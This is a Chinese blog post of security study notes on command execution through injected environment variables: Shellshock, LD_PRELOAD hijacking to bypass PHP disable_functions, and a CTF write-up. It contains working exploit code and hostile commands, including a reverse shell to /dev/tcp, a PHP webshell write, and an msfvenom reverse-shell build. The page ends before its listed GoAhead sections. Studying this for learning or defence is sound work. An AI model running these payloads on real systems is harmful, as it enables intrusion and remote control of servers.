<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | 环境变量相关问题</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.98.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-203328343-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script>
<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(i,t){var n=document,s="script",e=n.createElement(s),o=n.getElementsByTagName(s)[0];e.src=i,t&&e.addEventListener("load",function(e){t(e)}),o.parentNode.insertBefore(e,o)})("https://amiaaaz.github.io/lib/pangu.min.js",function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>环境变量相关问题</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">属于是漏洞界的当红炸子鸡（老油条），再不学就赶不上热乎的了</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&SUMMARY</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F>环境变量</a>&nbsp;/
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/rce>RCE</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2022-03-23T18:33:39+08:00>2022-3-23 18:33</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#普通环境变量>普通环境变量</a><ul><li><a href=#shellshock--cve-2014-6271>ShellShock / CVE-2014-6271</a></li></ul></li><li><a href=#ld_preload>LD_PRELOAD</a><ul><li><a href=#bypass-disable_functions>bypass disable_functions</a></li></ul></li><li><a href=#in-ctf>in CTF</a><ul><li><a href=#plaidctf-2021>[PlaidCTF 2021]</a></li><li><a href=#pbctf-2021advancement>[pbCTF 2021]Advancement</a></li><li><a href=#湖湘杯2021-线下multistageagency>[湖湘杯2021 线下]MultistageAgency</a></li><li><a href=#虎符ctf-2022ezphp>[虎符CTF 2022]ezphp</a></li></ul></li><li><a href=#real-world>Real World</a><ul><li><a href=#goahead--cve-2017-17562>GoAhead / CVE-2017-17562</a></li><li><a href=#goahead--cve-2021-42342>GoAhead / CVE-2021-42342</a></li></ul></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><h2 id=普通环境变量>普通环境变量</h2><p><a href=https://tttang.com/archive/1450/>我是如何利用环境变量注入执行任意命令</a></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#111>ENV</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;$(id 1&gt;&amp;2)&#39;</span> dash -i -c <span style=color:#d88200>&#39;echo hello&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>BASH_ENV</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;$(id 1&gt;&amp;2)&#39;</span> bash -c <span style=color:#d88200>&#39;echo hello&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>ENV</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;$(id 1&gt;&amp;2)&#39;</span> sh -i -c <span style=color:#d88200>&#34;echo hello&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#111>PROMPT_COMMAND</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;id&#39;</span> bash	<span style=color:#75715e># 执行命令后给出交互shell debian无</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>env <span style=color:#d88200>$&#39;BASH_FUNC_echo%%=() { id; }&#39;</span> bash -c <span style=color:#d88200>&#39;echo hello&#39;</span>	<span style=color:#75715e># bash 4.4及以后</span>
</span></span><span style=display:flex><span>env <span style=color:#d88200>$&#39;BASH_FUNC_echo()=() { id; }&#39;</span> bash -c <span style=color:#d88200>&#34;echo hello&#34;</span>	<span style=color:#75715e># bash 4.4以前</span>
</span></span></code></pre></div><h3 id=shellshock--cve-2014-6271>ShellShock / CVE-2014-6271</h3><p><a href=https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html>ShellShock漏洞回顾与分析测试</a> | <a href=https://github.com/vulhub/vulhub/blob/master/bash/shellshock/README.zh-cn.md>复现 - vulhub</a></p><p>应用于bash 4.3及以前</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ env <span style=color:#111>TEST</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;() { :; };&#39;</span> id<span style=color:#111>;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ env <span style=color:#111>x</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span style=color:#d88200>&#34;echo this is a test &#34;</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323180512946.png alt=image-20220323180512946></p><p>对于vulhub的环境，还可以在UA头注入</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -H <span style=color:#d88200>&#39;User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id&#39;</span>  http://127.0.0.1:8080/victim.cgi -i
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323181632204.png alt=image-20220323181632204></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323181715322.png alt=image-20220323181715322></p><p>对于当时的各大web服务来说影响相当广泛，只要是运行CGI相关服务的系统都存在被利用的可能（因为会在底层调用bash），比如</p><ul><li>运行CGI脚本（通过mod_cgi 和 mod_cgid）的Apache HTTP 服务器；</li><li>某些DHCP客户端；</li><li>使用Bash的各种网络服务；</li><li>使用ForceCommand功能的 OpenSSH 服务器；</li><li>使用CGI作为网络接口的基于Linux的路由器；</li><li>使用bash的各种嵌入式设备。</li><li>……</li></ul><h2 id=ld_preload>LD_PRELOAD</h2><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#define _GNU_SOURCE
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#111>__attribute__</span> <span style=color:#111>((</span><span style=color:#111>__constructor__</span><span style=color:#111>))</span> <span style=color:#00a8c8>void</span> <span style=color:#111>preload</span> <span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#34;ls / &gt; /var/www/html/look&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// system(&#34;echo \&#34;&lt;?php eval(\\$_POST[cmd]);?&gt;\&#34; &gt; /var/www/html/ame.php&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -fPIC -shared evil.c -o evil.so
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp <span style=color:#111>lhost</span><span style=color:#f92672>=</span>192.168.31.29 <span style=color:#111>lport</span><span style=color:#f92672>=</span><span style=color:#ae81ff>8426</span> -f elf-so -o evil.so
</span></span></code></pre></div><p>加载恶意.so文件来劫持任意函数，常出现于bypass disable_functions和打redis中</p><p>当web服务提供了自定义环境变量的接口，也可以用它来rce</p><h3 id=bypass-disable_functions>bypass disable_functions</h3><p><a href=https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/>浅谈几种Bypass disable_functions的方法</a></p><h4 id=getuid>getuid</h4><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>int</span> <span style=color:#75af00>geteuid</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>const</span> <span style=color:#00a8c8>char</span><span style=color:#f92672>*</span> <span style=color:#111>cmdline</span> <span style=color:#f92672>=</span> <span style=color:#111>getenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;EVIL_CMDLINE&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#111>getenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;LD_PRELOAD&#34;</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#111>NULL</span><span style=color:#111>)</span> <span style=color:#111>{</span> <span style=color:#00a8c8>return</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>unsetenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;LD_PRELOAD&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#111>cmdline</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -shared -fPIC test.c -o test.so
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p&gt;&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>$cmd</span> <span style=color:#f92672>=</span> <span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#34;cmd&#34;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#111>$out_path</span> <span style=color:#f92672>=</span> <span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#34;outpath&#34;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#111>$evil_cmdline</span> <span style=color:#f92672>=</span> <span style=color:#111>$cmd</span> <span style=color:#f92672>.</span> <span style=color:#d88200>&#34; &gt; &#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$out_path</span> <span style=color:#f92672>.</span> <span style=color:#d88200>&#34; 2&gt;&amp;1&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$evil_cmdline</span> <span style=color:#f92672>.</span> <span style=color:#d88200>&#34;&lt;/p&gt;&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>putenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;EVIL_CMDLINE=&#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$evil_cmdline</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>$so_path</span> <span style=color:#f92672>=</span> <span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#34;sopath&#34;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>putenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;LD_PRELOAD=&#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$so_path</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>mail</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&#34;</span> <span style=color:#f92672>.</span> <span style=color:#75af00>nl2br</span><span style=color:#111>(</span><span style=color:#75af00>file_get_contents</span><span style=color:#111>(</span><span style=color:#111>$out_path</span><span style=color:#111>))</span> <span style=color:#f92672>.</span> <span style=color:#d88200>&#34;&lt;/p&gt;&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>unlink</span><span style=color:#111>(</span><span style=color:#111>$out_path</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><pre tabindex=0><code>url/test.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/test.so
</code></pre><p>原理是利用<code>mail</code>触发<code>sendmail</code>，再触发<code>getuid</code>（已被我们的.so劫持），最后执行命令</p><h4 id=preload>preload</h4><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#define _GNU_SOURCE
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>extern</span> <span style=color:#00a8c8>char</span><span style=color:#f92672>**</span> <span style=color:#111>environ</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>__attribute__</span> <span style=color:#111>((</span><span style=color:#111>__constructor__</span><span style=color:#111>))</span> <span style=color:#00a8c8>void</span> <span style=color:#111>preload</span> <span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// get command line options and arg
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>const</span> <span style=color:#00a8c8>char</span><span style=color:#f92672>*</span> <span style=color:#111>cmdline</span> <span style=color:#f92672>=</span> <span style=color:#111>getenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;EVIL_CMDLINE&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// unset environment variable LD_PRELOAD.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// unsetenv(&#34;LD_PRELOAD&#34;) no effect on some
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// distribution (e.g., centos), I need crafty trick.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>int</span> <span style=color:#111>i</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>(</span><span style=color:#111>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#111>environ</span><span style=color:#111>[</span><span style=color:#111>i</span><span style=color:#111>];</span> <span style=color:#f92672>++</span><span style=color:#111>i</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#111>strstr</span><span style=color:#111>(</span><span style=color:#111>environ</span><span style=color:#111>[</span><span style=color:#111>i</span><span style=color:#111>],</span> <span style=color:#d88200>&#34;LD_PRELOAD&#34;</span><span style=color:#111>))</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>environ</span><span style=color:#111>[</span><span style=color:#111>i</span><span style=color:#111>][</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;\0&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// executive command
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#111>cmdline</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>$cmd</span> <span style=color:#f92672>=</span> <span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#34;cmd&#34;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#111>$out_path</span> <span style=color:#f92672>=</span> <span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#34;outpath&#34;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#111>$evil_cmdline</span> <span style=color:#f92672>=</span> <span style=color:#111>$cmd</span> <span style=color:#f92672>.</span> <span style=color:#d88200>&#34; &gt; &#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$out_path</span> <span style=color:#f92672>.</span> <span style=color:#d88200>&#34; 2&gt;&amp;1&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$evil_cmdline</span> <span style=color:#f92672>.</span> <span style=color:#d88200>&#34;&lt;/p&gt;&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>putenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;EVIL_CMDLINE=&#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$evil_cmdline</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>$so_path</span> <span style=color:#f92672>=</span> <span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#34;sopath&#34;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>putenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;LD_PRELOAD=&#34;</span> <span style=color:#f92672>.</span> <span style=color:#111>$so_path</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>mail</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&#34;</span> <span style=color:#f92672>.</span> <span style=color:#75af00>nl2br</span><span style=color:#111>(</span><span style=color:#75af00>file_get_contents</span><span style=color:#111>(</span><span style=color:#111>$out_path</span><span style=color:#111>))</span> <span style=color:#f92672>.</span> <span style=color:#d88200>&#34;&lt;/p&gt;&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>unlink</span><span style=color:#111>(</span><span style=color:#111>$out_path</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><pre tabindex=0><code>url/test.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/test.so
</code></pre><p>这个属于格局打开，不局限于劫持某个函数，而是通过preload拦截启动进程</p><h2 id=in-ctf>in CTF</h2><h3 id=plaidctf-2021>[PlaidCTF 2021]</h3><p><a href=https://luker983.github.io/blog/2021-04-26-Embedded-Webserver-Null-Byte-Injection/>wp</a></p><h3 id=pbctf-2021advancement>[pbCTF 2021]Advancement</h3><p><a href=https://articles.zsxq.com/id_xipxbpei4eti.html>wp</a> | <a href=https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/>wp2</a> | <a href=https://www.elttam.com/blog/env/>HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters</a></p><p>是GoAhead框架，在route.txt中增加cgi路由</p><pre tabindex=0><code>route uri=/cgi-bin handler=cgi
route uri=/ redirect=/cgi-bin/date handler=redirect
</code></pre><p>以及/cgi-bin下的cgi脚本</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>datetime</span> <span style=color:#f92672>import</span> <span style=color:#111>date</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Content-Type: text/plain&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>today</span> <span style=color:#f92672>=</span> <span style=color:#111>date</span><span style=color:#f92672>.</span><span style=color:#111>today</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Today&#39;s date:&#34;</span><span style=color:#111>,</span> <span style=color:#111>today</span><span style=color:#111>)</span>
</span></span></code></pre></div><p>而由GoAhead的cve我们知道（但好像这个题在当时是day题 没有公开的cve-2021-42342 而这里用的就是这个），上传表单键值对可以写入环境变量中，我们选择在PYTHONWARNINGS环境变量引入其它模块，再通过antigravity模块对于browser环境变量启动响应的进程，配合perl+PERL5OPT环境变量进行rce（更多内容参见上面的文章</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -F <span style=color:#d88200>&#34;PYTHONWARNINGS=all:0:antigravity.x:0:0&#34;</span> -F <span style=color:#d88200>&#34;BROWSER=perlthanks&#34;</span> -F <span style=color:#d88200>&#39;PERL5OPT=-Mbase;print(system(&#34;cat&#34;.chr(0x20).&#34;/flag&#34;));exit;&#39;</span> http://advancement.chal.perfect.blue
